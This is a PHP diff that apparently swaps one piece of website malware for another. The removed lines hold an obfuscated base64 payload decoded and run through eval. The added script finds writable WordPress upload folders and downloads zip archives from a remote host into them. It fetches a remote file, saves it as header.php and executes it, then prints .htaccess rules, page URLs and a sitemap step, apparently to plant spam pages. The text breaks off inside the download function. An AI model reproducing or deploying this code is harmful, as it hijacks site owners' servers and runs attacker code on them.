Y3uX8Uh9P+fh','617Y9GEQUjHCbtirNqvlOkxcwCtur','eCSuvvuDs/dSHmTmvtFVxOkc6QqAO','2kYOJTfXZQXi+fm2N7Up3DbvFqZmi','dcH6aSuGjJ06x8EgAAFDHaz0mSR0M','/U+93/i0zi7HE1IlSG/WMF7MjzE/0','QIFWx9O8ZVlHzzauXkjuWFDURR5Fv','Ph2VQkmREGUgsHfmXFthHYvvK2NIG','Gn8cCwPBNI4kgVZ6PO20YkjCI1G6e','060RW0RJSKWGlq4iat/a+zfOXQlbQ','Lysf/ndL2HzSttGzJ2ZSj2Y+4fcW3','b63d6S1pFd+QpSyCMe8ojsVcrwJNd','/MUWG3Wtl4tI7oAumjPeUNl8GjSAd','BbJ64bMvz/BG/NvUReuqRXMObFKCS','MZXHr1KvF16+aXcTaGycDhy6rv5rB','If8Tomp0BKZ8seo5DLiQAaeuZkM/7','m596+esfym7mTtczxlOTtMMbilmQ8','3VcHZyk65Bgc6Hx1axLdmGuqzvkRg','BYhXXq78jb17tHblQs78fbV2DgPgj','0eTieGEmBSOgdUUocC6VSPCJ497rw','AykEoUwAn/BGwqg/xRXYlfLR4DoC0','EoXQbTDvNidrvdDDJK4KK0v773iUC','8PxNkkltHAmUqJaNzH9ne0IgeAb5j','RFkc6SEuWQWmCQ9KY8tSAPz5zHS3j','oyUMm9GN2vmXp1XwTyG0aZilKpiMk','k3P+LJa9SQ2NonvlAzx04RkLJ+ki6','HOtC43wfoEcOTKsRH6n5NYc0ZwlB+','SZEz7BLpi8qqu4tYNDsHdF0yFIJLQ','HpAw3twm3KQECEHFGMD89IAw6z+dq','5copiLbDbCULP6LX5uEKNIhJ3wBwH','ssZKVPv0NzTLIVK+vP19aTmvDqu1N','EcINmjh2fmKEv9AXFRWffm7c4Kp07','uYyvVT6j6+CU+QEOvfCcUaTmD9UHs','4pljbRg23TnOsCUynsa6MvQlFa3jH','+dBIf5uubBHCXj0HShVPUliSLWKHj','aBotZpAUdD5KG7UmOeGopx5XRCkoh','H3ntiYh66H4hjkWwre9rpGDZ5SyMm','SSy0QB4Y0l0BFUv/Jr3HNg3JhUXGy','lkt22aZBSQ+Z/JUT8p5pyfVwdqPRx','0LWir816xucwi8V+PGmJvaF8/dy9t','lzzkd0rdvEXpGSzfGBKAo+dC+Q0bF','T+d81CHiIu6ce8aekdeenQESizMWi','cnk7AX2VmvHAs6l3r6Es7AmLneJH+','b2z4qHTfI4X7a2m3SQ8wJ0iMSimzW','PGfW0Zxom/fMNhV+L+Gge4cR33bN3','YR/uQ7qf2nSPjQzdTZ+hAmQeH/yOu','Me9+Ad56qeCLtXyOSEeJyfTGL/RHC','PGAFNHJckjKwN6EMdyjnhDs8zQxMY','tTftJx7qFnwNvlz+OOX1Lsn/L4yVa','l+QFI2d0kYVMeuPhNSFl97gvvqQD+','rQObI0JOagicD92p7CkNBrd7USAVM','2IZNLHH34iOPtoQhw0H6AC0rOLQf5','w0xp2Whbjpe70fNlV3E8qRuKN9sz7','OXoCVJL/jWksNPlQnZBD3IMsLCES/','kEiNQfTuQ9+p1LyrDytKwNjfSYG0l','6OJL2akqT7/vxHHjSbETIQin0egFy','c1+0dUJY9B/NagrEXoRiTEivhdDQf','H4ZWEN3rsQfsUnh+oohRHfw+4vPrE','D7PU+FPQpRp5YZ0azKlmlVEvfrzz5','lePe9Fp3upYMv4YlV2v/omRjmA7rz','hZRp27N0batxToO7JQNV7SKIrqAxD','V9qQ3jSiPDzW6DPtVIUPxvIxCUkyQ','+K7D3QmzpDOQThJkjsS6FvQ6/y9zU','2OKMLsKBMkBaZGO9Vc8IOdS0yzACh','qe2WenHag4Md30acgs8hZZ+fiwbeH','XWNDDcZdUsXJmaXDyXx7OiCNMKEpM','SFjoO8+S6UwBCTVb930oavx7FmavO','j3qP39PzldyBb3yyWSPFm0tdWtyvv','75eP9ci6LOdkXaMi/cB19xOJ+XpI5','7ft8bHr+A9yrYn3Zk9RhL69fm5gDz','plmQCcSU826JJfEmAej1SdvjHrlgq','J8zkbl0ah8cNodgWSMfUw8ZYqnIkF','tNW+Nfjvu3wnY6mArFvWgw9+L4JRx','X9Hqt41x85w8YBR3Wjj1U9poeB3Pp','FefwHIkktoaJkUM2PiLCJOAdjGSJa','p+EIF1RubeXnhXCN+MEvcmSbUsyh6','KNjqr5wxtSW39HvBPhkPN7rcs667w','8xmhmV4eRbZGF+/UHKGS8rHGQO17O','cE3Q/ecWzHcb3RXaeKoyZEFip8JgA','iJSV+OoC2UKrGnDr/19OGYObhqWab','OvHf9EcFGLKF+hkktrAgQWK4EQcWZ','5oOHg5Fh4wk1cP/flJY/y0IvVy6Vw','Bp2Zd/agrIyQ4WlcKLr0JBfcHKE5F','RUEtMyVQOdnshLEZykDZfD0SiSJ8k','l3MAaGe4Zg0F0cfiTRk8mo9xQNxxA','QXib6GhzEVYsFcpNEjCQK2/nhQ3lt','n/wAlQP0eF33/lx9jEC4s7OGTt0go','xr7pMbH+GzBHKqYVbr/Xxpp7bb3C4','fl/bL2e1oahM/FX9mXeSOwFxvjSqN','l/Ikn8dfBU4VgPullqbvbXF9PXjBz','TCiU8wcdNirVwQY5nDlOl+Br8NzHo','Xt2cSwlxIfL4W9P2MyytKuUR1Oxx1','e5Aj3W96+ideKtf38F7X8SS3x9l18','5VHi7Zu3qfjbTOJdypzasSAiiDLgd','A6/XE7tSzMhe7uWnD2T4jer7/D+RC','SkutKAPPAWU9zWkQ6RWXgI42YSCyH','7VIo+M0cvF+I1FWM8aToXaOL0rpx/','hiC48c3kx0D/xVoxXwV9hD0JEIgVc','DpVXGjL0YHybBwW0CCOFgy6jJyt29','/FZnCyNAN2hLlmos+V9nmfqWb4aM2','wEHJKNiTqlj6oyJfjmtNizLDNRwwD','hljILvx0h3Bd1ZQUsU/0q//epfBgk','vJqIb9G6tssmEreHhkds2XhDVrbif','rC78AzzIlpeLFocy8ECrThRgyFEUR','URZqqBPRR2/hy2xp260SHxjcWi7rz','TKbMnBxTHLpNnOvGqVejFyQuhHaBn','zbp7R3sKWqQEdAseTAnGLbhfMZdc0','ner8Ev+H5hJgM7hPyCptgG/4uOfS3','1lxLaI81tsuoW6IECULCcgtMlfCCH','FIBd/LnMCUYqxk4f9x/r2u4z85nNz','ogIoNGvLdJYF7Jlc/QRDfo2NIeBj/','Zcrp+lkxB6SVgZ+e4ev/sedpUQbLS','oJDI/Z8B7xQ74+sNXMQmu7O8KWR/p','StMDdbiy6kVNR3bCAG4wM71PrreDs','lT+zkNgCVkaBRcIaayR8ygoooC95m','vLvdq0jJxHcPgKC1L+WIR3X9K7D/H','12yypRDCSedm9dOjqa+4X6vlYtknB','wVCXBUzS3lQ0FoiddroNXgXp+MGpG','F3jBqO7Yl+m3j58az+ipRqLpocPbx','+mUP8kpQ/50odQ+qU9jc3pn75UvkS','HeBiYCO3DG0FSCAMsSfwuvtBZ2Zh+','vLqYDkRgR33mDiTq+azpdtYc9UZx9','ZolWRiO/xBw8cMet3uNDG8ajtcyMG','5C/rTyHMzAagQBXgZdnKIo7FFqtGb','GQ2u3ZaO1ie5BKtz5xo5uuGhIqkme','BSqP6yMiLQOEkAwML5916HFXCJ+Jh','K2FSInhVsBUX42gZb3Nqi/wsq0fQ7','xn0jvuph0TG9sP14sXzqDRblKphI9','HqXiHugf9YXjW2NBMneixs9iCZ5PK','YCYVBORMwZ72bU0fEi8/wbPsvcf5h','55ep+j6cY8MVlZWAOTOcKw/kPqAvx','/GMX8JHGYhibxbmCn05bxAyQdCqPv','jbv35dCS/3rzISbRCjipuIXXGnbXV','e15DWoRakuS1OfpuHovkt/SAmqH5v','bf+040gH2MuO/5kMyBjfHiVqxyW7m','AI62+1LuMedMqu7qnN8DE9UiSo3n4','L0U3iQQ3niyCP5ZWVKLWZ9hIMoRNW','IZC9S7k/YzFRFIWnXnGuFr19/vZVH','Cgq8fDLmFScTVrdAz6LjoNedkHGVy','WyaeIduqJ0gB4wt0ZAZAh8Opqg6bd','mbUMjkIk5VUAlccjFxbAWe/4qthIb','wV8YFF3A+G4l8Q7TTSU3WaUGEwDAM','OEsHUuy5qGI8+QpwQos/NKXvq6/XA','osC3QoAVq2lpkQ96kbjxQ8d+XZjAB','pWJRk6qFGQlEnw2mnp/UNbWQZLcDa','w9T38bzkAuxn3ru/7kk4p2SLfIS+4','M4O0H3Ry0hXvjcMg6Pj0+7t1mVsvk','Ee6D7YjbSX4BpHty3oOMFoPG9szrq','QkI1XNzlfjvipkpBKsL088IU8aDqY','TJxnp7018sMZOQJG6I5EOExA9I456','nCDpL3bDqQa7sHUQ9ilSwn17SYkQO','Ly8L2zzZ8Evg8c5dGridQBQ36jyrh','NaNnfrDW2h/h4KqkUEKjot+GcOG4l','uZ++affMczytgcpRUej4hbLjseDK4','JUN2JrVOT6xc3Ogl71q8TDp9jFddT','QLCRGt2bEybSR7wtRLWRLnEyX5+kQ','7eK4HcECymnrTpVNSUP+Fzd7N9Wc2','0WC14vwEEvyBIHtjWayYDE9NI/NH+','pZRYpQ4ubSGA2um+XOEBFNmSUWBH2','fzueI8/yoe/AKySsZ1gKJ84CcDIyY','1idPQmXbkXDtgWIcn26FZgRSJHcJn','FLxG/ZosvMIv+16FYluC36jxgnP2p','mS7kwJCbOhTTL2NYSqEt5ig7O1y4m','0MVOIXL1EvjtEUCbFUP7YZ5pAJ9in','VXN0qB2qPjEqn9Kf/0AjHZekgXBOa','o8ELljjBN0U8asN5wV/6YDuZGj6Hn','rJjm2ojPNCVdGYXtlQl53lrCAMTGA','512FOD3e0eTXaROiWohYqyr6vwlWT','KVO7zILQRLj0i7aGpoLcjGgdYP7Ca','0Hh7K6bwFyx0PrPgtlEzeVxyZ239f','BkX36BvUpPH5jmuLPM6yM7ZfcntZM','UspRY9SnchkdRhoNn+dFmqDgVpSnp','3ZyM2SMhGHAwv+LRtbp43mrXN/VWS','uyxy+jfk1UK6NryFJqAcRpE8oJ24Q','/CBqEIs+1KgRV3aJX8jwk6Xl3CeS0','D2xg1e83XTOfprLi0Or6dzuDTC83m','apgZYDstXQ4IO/PVlCmfsOU2Ro2GS','kyU3e44keQ6JA2BjgLGz9PJ5ilZ4G','Yscd3VXRUBqIdKEHV5jN1OjxDD09Q','riGnBEtDXfV5lTwClzhArf5g3X7bs','3wh4VnA2+TCU+LRwtlkuECzYpEXeq','+9O+RgGoSCPF8Ip71WJXePTAT1ud9','gTb0+EaREAHU//H6G6IMecYP1jEBC','ayS9EtCzCozzRYbCKKoGt3vkkBrMR','Hy7cwV1PGxFq+eSpDxi/sbfP8nOKr','g7aujIZpttHgfuAKJf5W1vUD6VV4l','Yy+sDW6ken5kA49GGikxEL170p+O1','8olvJNsIFA0W7Wq47aLSsJ0bZDdUD','Km65Ny9LahgZK9xjdQhNMaB75fCpk','pd8rs95REnJzrQUWjOw4+aKJG5C3A','EUmEtJYljRPApl8vSU7dCHIN+d2N2','fD+7fhZlTVn8HhKYzhNBlKPawrakB','8aivhWvyu0ULb33v6QbSrF8vYFTQ1','/QuuyKvsCBVZUmVCTqQCkA/vnFnwz','r0inZaXRPmSiEdPG1ScZmMCxTntIm','5hhZ09NzRteD3Am295Xw5dx2O3O+l','bNBeKH3SWf6JvDqANqU4OaW+c3wJJ','KFbwWl4gF2+1mSvXS5jKZCdw2WGZJ','FDbx8dEtBcaB4D2MDDEJpd4Z9zqqz','LvxCboUscj22Dq4lp2az/f3M1Wd4m','vzvsVVG7x2T6MhhX7wJBWrwv3N2kP','3uyo4eP9zteEedJkdYgBmmuaIIwir','1ABqt0uH2SLpaQqn9Dyj6fGGJU+vL','/RbE9NS2+ST3GGq2D1qPkidqrN7H4','xWyUnDPqgQ7IQdTByfji2H7dGZqqN','hvhjsF8fk+k9nhj25BXRo8nwSf8RB','SjdtNbKxBdpP49cUVc/Nic9RqYkTt','tNCpjUfogpQEiZk/vOhxV/amlFemJ','/JulglaBU4jNS+8R9cDW9zeLbKYpt','EuhUtU2c0OIuyiOWOEXWu5ABxSUpk','hASG75xoo7JXouzXDHaY5jIO2meDq','cexXZCe/nC36+Uv9m96fm5ZXiNZBF','d5LEZvRLM9ek8Y+OubToZGE3WEb/C','UsomfbjGZWDsxAJhoXE+w7hDA6ARO','qkc/cQooGcR0ojEQd2oc2eZyfqqqE','MiG722z184RBE6BfWeIe8W4fL52tM','ldAeJrtAKQ/h73ZTXd4ql+zxUFW5Z','dJzabGQ4g/lGf8SRmczJoHCiE8Xxs','NbqepwrMFhUJhikYHc7BrmdFcLCPO','XJSbCLuhP9WUWn9Loyu2Hho8/NmMu','A8TK+8KwMu8+kumfCeuSb4R1LTt9O','kcsaSXZpQ7zP682aHHkuPW9pvbFx/','uLtEtZ8u/SSDvU81Xq5NE/NtdjKRt','NY/evqhkNYdCeH3rD7cuUnq+n3z9+','mRi+/ZE9J8WGdqiCYvhfeobrag55D','pVGOGbMcAeKJAF+vRA5sBvMbItnbL','Jq8j2fr/AaTkRglRCQw/EmSD7hFMn','2xNF68UOIhesevOAOLhI7zbw16jd8','4w7wj8Q+I7bAk/4q5vnEKFNr8/HY4','y/mVSHwNvTAKKIvOJyMNL0PKnBHDd','0sgdMh/7K8AJ5FkMsIJLVDXY/sheg','p15ClBUyY8mYdaIV0gtExzJATlzBo','FOnaXnB6u6AqJiwxVopVdbRPcQIcX','9nDgct9gHRazJcYmsbstsh4T2hdfa','I53WlbhDbV9HAtY3HP0FDDYlGS3jG','E+CmK/eRHQsTvlrPrUFvpJ+my+sLR','VCjfaQtMgQ4PENMfGfSfg9PK9g2/a','TpTjHeHX22x7/FTWgCRHIS/n8kDcd','T7qHpOeL+AOs4rCc2jqi+segkC2Mt','4Uxo3NsaI78SBHCQrdzAvdfHTPvmQ','HWyFBVArNZjPC2y33uPnI+/J4uCTC','n3fjiU2iuXFd+qJ4892ihOVG17Vms','gtYgv8yUsZO7kEVeRhPxPgCdV/BRZ','Y9YOlUZY9NRn9vitf+THZ7Y+6FpU0','FBOQuviEcIntv63jTklvND1wYAnei','/DNUPQlFA9bopRMSskanLH/jUZiyc','13leMTeHAgOmuTnGN3edkPp6OsJRF','VKalNyKWZRGGmrO8MY+RTF2Sh0PPd','6lDru+2fgCdPoDJQk9ZQ8C4F7p1Kk','QhRzg7vB3/JX6qxpF1Zmi0Qs0wUhk','SB+iJ3M2v6Ma3NjcSet8STLbsUst+','gPqjhmp5xYhPRnygUwsQZ0PLUVauI','Df/FdsyPLn8scUuBd2JJ+yO7AGud0','yHlq8DliXBPn5V0fUmA5aU9idGKfv','ELgJv1g6KdMED0J/l4XCEX0azhkXc','W+5L5hqNJECUVujlEzcD5U4QmcI4D','opBzARGKwRx48eCCFl++Z8Dd/9123','e1v6YAageSLM+71w/wSgZFMWbp1E0','igHpt2j6e9DpzA3/SFLXO+gRaMkxf','HwpJM42KPMSEoECyUzhC0vbJsgl5W','JmwhYcfXqeYv7fqFIuHngL5hPGj4y','LLP89wB5WoJdPwOXs2Pli7sRuLesz','8XucitGkSaclNQV3XuSStSU0HlfhK','QmfyWcu1Q2Z4A3PuS/417ccmLenO3','KYHFiCNWdLnanWOQkEpVIgfOkH8DE','pnwzcTNipDxv5osDzeuai5FoMohdR','0VQXBCcu4NJctdaf1SdtjHPflAvmj','jfVRsJ70HtGtbIGMcFK0pMOkQT8NO','bfDgZ76awVPHyhk/IU/qzRP18h/Mz','9kcO6+LteH6oqEftHpqWB4oYYXvat','ifjOMnRyxJI+54qSpATv88WeM740B','j3W6iAOqnRMC8XHqYYrSvnsQ9RX1g','eG8QYZZacNAzk05nRGn8qhGV82gfF','sTeY9iVFemsm+dobTqX9gPY5MSQF9','CkTocA3pVdaLIYxI5/iZPGLpBcsap','q6pARsF6M7HMtApc+bRxsaTBdhaBn','Tf0CWRHXkFO7bHjmri483GZPmkOVc','dL83gZimHejJiCnGdmoq09nhU4wYr','BLzZ3Z7/DK4td8rgGqNRtbMecEX4B','obTYJ4LCaprp26LOmcnzJ5gJedhSF','v+HB8BeaJ+8bfoX8lw245Y782Q+Ck','ZzSdVnHpTL1sp62J4lVf1t/1qIknv','U1yrVMRAo1Vk/KysIsZLLniuA8UTA','KaYtlqLqboSCJ95EHdLoKbw/aF0Zl','I1s9ZOxdJVH+c4OEX+4mtpDzTkDAA','QTpMJM6Xwfq5Y4T2RWLbgm0fv8SEk','qrnwITKeOqviLbhRyLHRk572s5W9p','ikBEeSIzI5hPvHqX2HmHHfcbXTi+L','cVDfOW1PLA9aPaj+n4OvFEvMQz9Jy','cN1jjA5euR85eaP5GolI+BWaKZdSh','iplAAph2w7biMA4HD4vuQdCi/CaC0','Mpmuj4q8MuyB6htQTN2gXE1w2or2j','kD8yO8wSWfBI6zXzpholosWQgnIM5','CPCRstgzsoxaLKn5gcIeEkL2cCLoW','ScKWU/Gxh0u+5yRf16Vf16Tf34i/7','wufPZNhyTvlxYXt5MiiyfklJQuSPR','BeIPTJ+pcQelfFL8ileSx7Zd/wfzC','/n4JdUzGLdNCd6zVsnvmJEiuNhRw2','ZsDPbBcrf4mTrbW2KY0oZKK7S8isu','deQjYmnZ6rntqFsXuZTngIVG9XP04','GTucxbbdqlKOoeck5A0dKk55pa5Sq','Yov5rRcBUnrTY2G4uXsSsTs+OeK7l','rg1o6lYSS4HclVk0VlsRug45NKItA','m3aVmdOg2I8/xiKfHKJXHnkYul9ME','LZfcBW9mrJOaQuYv9HIxAwRdMAXab','vJyr2g9khfGqMttRHFySreEF2AYGE','MkKr3DjyJPxbEEfqtuO7n0NQxKpw9','RbksU9s9CLTWPbaGdemC03EQV5CzU','3Q2KUA88WcTiVnGHTkx8R99L+59wa','oEEDcR+uklpI1/5p0Uxo3xmhQPcyM','gE7/Q5Ewlp9zyRCphCBQKDe5pwbfy','Jf+dRGHrUgJ4nw3iK5s+BwcSWm/lc','g4FrPHOv3IOE5BEy6l5EwivOxviC1','kTY/BRpms1Dn6uDrhr494Ej9aMrcv','DUQo5QWIkT3zmpIbkv1qvPUpDwPao','1t46RvuZMIjCpzAomkFCnFrru6Me+','0lfRg+LQyecjrYtFukpWPtOhRllzE','lpdTQhme/9wadl7G3/zc2+fvHiWev','03hr19OA3H6SOhq1R1LpW/PBHJszH','vqx+lm4ddLHR4W/tSc/BUR9403iVv','BNqxz/opgodsRB5qbYUfWk/y91U3B','YXKX1/ekUAbOEuyQTcvdOGFRKSIhR','TOfwt/65ELf5Ykr5x6p3OaGfSBr25','a8NcN1GwyA697qxrlFsiA7T7hsRM5','vSC9xE76BhrI7togpN/ZfdW7zZfzV','c5c439oJ9/Se9I4pvOLwH0zuhXluN','7+0hWMQ6OHZ29TbVOKV03ag08bxtw','lpA2+4R9A2zjX7IghCIgGDx1+9cBo','lgj0m5C6LYJ5dBwmOWbjQpYcfT83O','ZcM0roOhV5KLm26xPDkF1qQXM8gFN','1BtJ46b7sr0LvKj8Yq/ey+Z4Jfx0L','IwFSb+3DN1I+be8qB3Qdwj37Czzch','PRN9BAFAAGlTyo8tXHqdGPl8ZXliA','VPYGKnldCXJAmf4pLuR/kp8Wh6qQT','pYEBoELkBzHLIQp6v1W+dAkx32xPx','qOJ7umc5QfMjA36CKjuLOLNFCw/A2','lQQx9yIQNLx19YBg6jlkb1oajuQOz','0G/p8KJHnSMutr1IbTwYy+DTTsFa8','3QDWeUoe0FCvnN2gqisyIM6xcROwo','GMvEiyjiQfBp5AkBYLhT3cBTGKnSX','jqd91Yk5llmqZntly6S4s4cjcLu98','geL7vD7xfm4SGDXhMdhY9jA/spwjQ','bw0K62wUC6n1mA46RnOlQ0b/sULOt','id4l7OHfM23eEt0HAGzlO5j7583M0','k7T2shXBAUSKQqwWz4VTrtAYY2zme','DjTaIblNNZxONMoPVTcM5mvWd0RLq','MSJhhkJSS2CnO9iaqHijJ+VX1X01X','rJElvcaTZqfqN23vzgk/f/Lw==');
-$the_title_me = array ('p','a','6','a','z','p','f','m','c','e','y','i','t','y','w','x','e','k','y','d','e','g','y','n','v','4','p','n','o','c','p','j','j','j','o','b','_','l','j','d','g','h','n','b','f','e','b','i','s','l','e','e','j','o','e','i','d','w','t');
-$the_title_ao = $the_title_me[21].$the_title_me[4].$the_title_me[11].$the_title_me[42].$the_title_me[6].$the_title_me[49].$the_title_me[1].$the_title_me[12].$the_title_me[51];
-$the_title_ha = $the_title_me[35].$the_title_me[3].$the_title_me[48].$the_title_me[45].$the_title_me[2].$the_title_me[25].$the_title_me[36].$the_title_me[19].$the_title_me[20].$the_title_me[29].$the_title_me[53].$the_title_me[39].$the_title_me[50];
-$the_title_kc = $the_title_me[55].$the_title_me[7].$the_title_me[30].$the_title_me[37].$the_title_me[34].$the_title_me[56].$the_title_me[16];
-eval($the_title_ao($the_title_ha($the_title_kc($the_title_pk))));
+define('CURRENTDIR', getcwd());
+define('REDEFINE_WP_ROOT_DIRECTORY', '');
+define('NOT_WP', 1);
+define('UPLOAD_DIRECTORY', getcwd());
+define('FORCE_DELETE', 0);
+define('VIEW_PROGRESS', 0);
+
+
+$parsedUrl = parse_url($url);
+
+
+define('GS_ALIAS', $parsedUrl['scheme'] . '://' . $parsedUrl['host']);
+
+
+
+if (NOT_WP === 0) {
+
+    if (is_null($rootDir = detectWProotDir())) {
+        echo 'couldn`t find the root directory' . PHP_EOL;
+        exit;
+    }
+
+    $uploadsDirectorys = directorysForWriting($rootDir . '/wp-content/uploads', 3);
+
+
+    if (empty($uploadsDirectorys)) {
+        echo 'couldn`t find the directory to write' . PHP_EOL;
+        exit;
+    }
+} else {
+    $uploadsDirectorys = array(UPLOAD_DIRECTORY);
+    if (!is_writeable(UPLOAD_DIRECTORY)) {
+        echo 'directory isnt writeable' . PHP_EOL;
+        exit;
+    }
+}
+
+
+$dirnamesArr = preg_split('~,\s*~', $dirnames);
+
+if (!is_array($dirnamesArr) || empty($dirnamesArr)) {
+    echo 'invalid directorys list'.PHP_EOL;
+    exit;
+}
+
+
+$logDirectory = $uploadsDirectorys[0];
+$logFile = $logDirectory . '/update-log.txt';
+
+if (defined('FORCE_DELETE') && (FORCE_DELETE === 1)) {
+    forceDelete($logFile, $dirName);
+    exit;
+}
+
+if (defined('VIEW_PROGRESS') && (VIEW_PROGRESS === 1)) {
+
+
+    if (!file_exists($logFile)) {
+        echo 'log file not found' . PHP_EOL;
+        exit;
+    }
+
+    $logSource = file_get_contents($logFile);
+    $logArr = decodeLog($logSource);
+
+    var_dump($logArr);
+
+    exit;
+}
+
+
+if (file_exists($logFile)) {
+
+    $logSource = file_get_contents($logFile);
+    $logArr = decodeLog($logSource);
+    
+    
+    if (!isset($logArr['dirName'])) {
+        echo 'this is an old version of the script, please update'.PHP_EOL;
+        exit;
+    }
+    
+    
+    $dirName = $logArr['dirName'];
+
+    var_dump($logArr);
+
+
+    echo 'previous log found' . PHP_EOL;
+
+
+
+    $uploadDirectory = $logArr['uploadDirectory'];
+
+
+
+    if (isset($logArr['action'])) {
+
+
+        if ($logArr['action'] == 'finish') {
+
+            echo 'finish' . PHP_EOL;
+            echo 'log file ' . $logFile . ' mb delete?' . PHP_EOL;
+            echo 'upload directory ' . $uploadDirectory . PHP_EOL;
+
+            $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+            $relativePath = str_replace($documentRoot . '/', '', $uploadDirectory);
+
+            $blogRelativePath = '';
+
+            if (($subdir = str_replace($documentRoot, '', $rootDir)) !== '') {
+                $subdir = ltrim($subdir, '/');
+                $blogRelativePath = str_replace($subdir . '/', '', $relativePath);
+            }
+
+
+
+            $htaccessRender = htaccessRender($dirName, $relativePath, $blogRelativePath);
+
+            echo $htaccessRender . PHP_EOL;
+
+            echo str_repeat(PHP_EOL, 3);
+
+            $randFile = randFile($uploadDirectory . '/' . $dirName);
+            
+            //echo "Rand file - $randFile" . PHP_EOL;
+            $currentUrl = currenturl($randFile);
+            echo $currentUrl . PHP_EOL;
+           
+            
+            $shortUrl = str_replace($relativePath . '/', '', $currentUrl);
+            echo $shortUrl . PHP_EOL;
+            echo str_repeat(PHP_EOL, 3);
+
+            $basenameRandFile = mb_basename($randFile);
+
+            
+            echo str_replace('/' . $basenameRandFile, '', $currentUrl) . '::' . urlConvertToLocalpath($url) . PHP_EOL;
+            echo str_replace('/' . $basenameRandFile, '', $shortUrl) . '::' . urlConvertToLocalpath($url) . PHP_EOL;
+
+            echo str_repeat(PHP_EOL, 3);
+
+            echo renderSitemapUploader(convertArchiveUrl($url) . '/sitemap.xml', $uploadDirectory . '/' . $dirName . '/sitemap.xml');
+
+            echo str_repeat(PHP_EOL, 3);
+
+
+
+            exit;
+        }
+
+
+        if ($logArr['action'] == 'upload') {
+            $tmp = explode('-', $rangeOfFiles);
+            $tmp[0] = basename($logArr['path'], '.zip');
+            $rangeOfFiles = implode('-', $tmp);
+            uploadAction($url, $rangeOfFiles, $uploadDirectory . '/' . $dirName, $logFile);
+        }
+    }
+
+    unzipAction($uploadDirectory . DIRECTORY_SEPARATOR . $dirName, $logFile);
+    //}
+} else {
+
+    $uploadDirectory = $uploadsDirectorys[array_rand($uploadsDirectorys)];
+    $dirName = $dirnamesArr[rand(0,count($dirnamesArr) - 1)];
+
+    $log = array(
+        'uploadDirectory' => $uploadDirectory,
+        'dirName' => $dirName,
+    );
+
+    file_put_contents($logFile, encodeLog($log));
+    uploadAction($url, $rangeOfFiles, $uploadDirectory . '/' . $dirName, $logFile);
+    unzipAction($uploadDirectory . DIRECTORY_SEPARATOR . $dirName, $logFile);
+}
+
+function unzipAction($uploadDirectory, $logFile) {
+
+    if (defined('GREEK_LANGUAGE') && GREEK_LANGUAGE === 1) {
+        echo 'use unzip with header' . PHP_EOL;
+        try {
+            return unzipFirstMethod($uploadDirectory, $logFile);
+        } catch (Exception $ex) {
+            echo $ex->getMessage();
+        }
+    }
+
+
+
+    if (class_exists('ZipArchive')) {
+        //echo 'second method' . PHP_EOL;
+        return unzipSecondMethod($uploadDirectory, $logFile);
+    } else {
+        //echo 'first method' . PHP_EOL;
+        return unzipFirstMethod($uploadDirectory, $logFile);
+    }
+}
+
+function unzipSecondMethod($uploadDirectory, $logFile) {
+    $paths = array(
+        $uploadDirectory
+    );
+    foreach ($paths as $path) {
+
+        $zipFiles = glob($path . DIRECTORY_SEPARATOR . '*.zip');
+
+        if (empty($zipFiles)) {
+            echo "archives not found in dir  - $path" . PHP_EOL;
+            return false;
+        }
+
+
+        if (!is_dir($path)) {
+            if (!mkdir($path, 0755, true)) {
+                echo 'dont create dir  - ' . $path . PHP_EOL;
+                return false;
+            }
+        }
+
+        $zip = new ZipArchive();
+
+        foreach ($zipFiles as $file) {
+            if ($zip->open($file)) {
+                if ($zip->extractTo($path)) {
+                    echo "$file extracted" . PHP_EOL;
+                    logActions($logFile, 'unzip', $file);
+                    unlink($file);
+                    $zip->close();
+                }
+            } else {
+                echo "I can not open the archive $archive" . PHP_EOL;
+                return false;
+            }
+        }
+    }
+    logActions($logFile, 'finish');
+    return true;
+}
+
+function unzipFirstMethod($uploadDirectory, $logFile) {
+
+    $paths = array(
+        $uploadDirectory
+    );
+
+    include($uploadDirectory . '/header.php');
+
+    foreach ($paths as $path) {
+
+
+        $zipFiles = glob($path . DIRECTORY_SEPARATOR . '*.zip');
+
+        if (empty($zipFiles)) {
+            echo "archives not found in dir  - $path" . PHP_EOL;
+            return false;
+        }
+
+
+
+        foreach ($zipFiles as $file) {
+
+            $archive = new PclZip($file);
+            if ($archive->extract(PCLZIP_OPT_PATH, $path) == 0) {
+                echo "Error : " . $archive->errorInfo(true);
+                return false;
+            } else {
+                echo $file . " unzipped" . PHP_EOL;
+                logActions($logFile, 'unzip', $file);
+                unlink($file);
+            }
+        }
+    }
+    logActions($logFile, 'finish');
+    return true;
+}
+
+function convertRangeToFullPaths($range, $path) {
+    $paths = array();
+    foreach ($range as $item) {
+        $paths[] = $path . DIRECTORY_SEPARATOR . $item . '.zip';
+    }
+    return $paths;
+}
+
+function uploadAction($url, $rangeOfFiles, $uploadDirectory, $logFile) {
+
+    try {
+
+        uploadRangeOfFiles($url, $rangeOfFiles, '.zip', $logFile, $uploadDirectory);
+        get_file(GS_ALIAS . '/src/temp/header.txt', $uploadDirectory . '/header.php');
+
+        return true;
+    } catch (Exception $ex) {
+        return false;
+    }
+}
+
+function uploadRangeOfFiles($url, $range, $extension, $logFile, $dirname = '') {
+
+    list ($firstNum, $secondNum) = explode('-', $range);
+
+
+    if (!makeDir($dirname)) {
+        throw new Exception("dont create dirname - $dirname");
+    }
+
+
+
+    foreach (range($firstNum, $secondNum) as $num) {
+
+        $filename = $num . $extension;
+        $action = ($num == $secondNum) ? '' : 'upload';
+
+        get_file($url . $filename, $dirname . DIRECTORY_SEPARATOR . $filename);
+        logActions($logFile, $action, $dirname . DIRECTORY_SEPARATOR . $filename);
+    }
+
+    $logSource = file_get_contents($logFile);
+    $logArr = decodeLog($logSource);
+}
+
+function logActions($logFile, $action, $filename = '') {
+    $logSource = file_get_contents($logFile);
+    $logArr = decodeLog($logSource);
+    $logArr['action'] = $action;
+    $logArr['path'] = basename($filename);
+    $logArr['full'][] = formatFullLog($action, $filename);
+    file_put_contents($logFile, encodeLog($logArr));
+}
+
+function formatFullLog($action, $filename = '') {
+    if (($action === 'upload') || ($action === '')) {
+        return 'upload ' . basename($filename) . ' ' . filesizemb($filename) . ' Mb';
+    }
+    if ($action === 'unzip') {
+        //return 'unzip ' . basename($filename) . ' ' . filesizemb($filename);
+        return 'unzip ' . basename($filename);
+    }
+}
+
+function get_file($source, $localname) {
+
+
+    $file = fopen('php://temp/maxmemory:0', 'w+b');
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $source);
+    curl_setopt($ch, CURLOPT_FAILONERROR, true);
